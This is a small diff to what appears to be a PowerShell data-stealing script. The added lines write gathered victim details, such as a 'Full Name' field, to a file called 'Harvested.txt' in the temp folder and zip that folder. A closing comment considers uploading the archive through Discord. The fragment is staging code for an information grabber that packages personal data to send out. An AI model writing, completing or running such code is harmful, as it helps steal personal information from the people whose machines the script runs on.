@@ -331,4 +331,11 @@ $output = @"
 Full Name: 
 "@
 
+$output > $env:TEMP\$FolderName/Harvested.txt
+
+Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZipFile
+
+######################################################################################################################################################################
+
+#Discord Upload? Here or?
 
